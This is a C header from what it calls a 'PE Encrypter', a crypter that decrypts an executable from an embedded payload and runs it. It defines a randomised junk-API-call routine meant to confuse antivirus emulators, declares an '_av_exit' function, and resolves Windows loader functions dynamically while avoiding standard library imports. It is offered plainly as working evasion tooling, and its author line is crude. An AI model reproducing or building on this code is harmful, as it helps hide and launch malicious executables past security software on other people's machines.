#pragma once
/*
	PE Encrypter: decrypt PE from payload and run it
	By Solodov A. N. aka SANshine aka Paketov aka Antichrist aka CatsEater aka KittyEater aka UniverseFucker
	2026
*/


#define _CRT_SECURE_NO_WARNINGS


#include <Windows.h>
#include <stdint.h>
#include <stdbool.h>


#define bool int
#define false 0
#define true 1

#include "Settings.h"


# define EP_PLATFORM_WINDOWS
# define EP_STDCALL __stdcall
# define EP_CDECL   __cdecl
# define EP_FASTCALL __fastcall
# define EP_FORCEINLINE __forceinline
# define EP_NOINLINE __declspec(noinline)
# define EP_NAKED_FUNCTION __declspec(naked)
# define EP_UNREACHABLE() __assume(0)

#define EP_USE_VIRTUAL_ALLOC_FOR_PE


EP_FORCEINLINE static void __rand_win_api_call(unsigned int a, unsigned int b) {
	switch ((b * 23242565u + a) % 12u) {
	case 0: {
		HANDLE Evnt = CreateEventW(NULL, FALSE, FALSE, NULL);
		if ((Evnt != NULL) && (Evnt != INVALID_HANDLE_VALUE)) {
			SetEvent(Evnt);
			CloseHandle(Evnt);
		}
	}
			break;
	case 1: {
		HANDLE Mutex = CreateMutexW(NULL, TRUE, NULL);
		if ((Mutex != NULL) && (Mutex != INVALID_HANDLE_VALUE))
			CloseHandle(Mutex);
	}
			break;
	case 2: {
		HANDLE hFile = CreateFileW(
			L"",
			GENERIC_READ,
			FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_SHARE_DELETE,
			NULL,
			OPEN_EXISTING,
			FILE_ATTRIBUTE_NORMAL,
			NULL
		);

	}
			break;
	case 3: {
		GetCommandLineW();
	}
			break;
	case 4: {
		GetTickCount();
	}
			break;
	case 5: {
		GetCommandLineA();
	}
			break;
	case 6: {
		GetVersion();
	}
			break;
	case 7: {
		GetCurrentProcess();
	}
			break;
	case 8: {
		GetProcessHeap();
	}
			break;
	case 9: {
		GetEnvironmentStringsW();
	}
			break;
	case 10: {
		SetLastError(ERROR_SUCCESS);
	}
			 break;
	case 11: {
		Sleep(EP_RANDOM6 % 10);
	}
			 break;
	}

}

EP_NOINLINE int _av_exit();

#define ep_memset(_Dst, Val, _Size) __stosb((unsigned char*)(_Dst), (unsigned char)(Val), (size_t)(_Size))
#define ep_memcpy(_Dst, _Src, _Size) __movsb((unsigned char*)(_Dst), (unsigned const char*)(_Src), (size_t)(_Size))


extern HMODULE kernell32;

extern HMODULE(WINAPI*ep_LoadLibraryA)(LPCSTR lpLibFileName);
extern LPVOID(WINAPI*ep_HeapAlloc)(HANDLE hHeap, DWORD dwFlags, SIZE_T dwBytes);
extern HANDLE(WINAPI*ep_GetProcessHeap)();

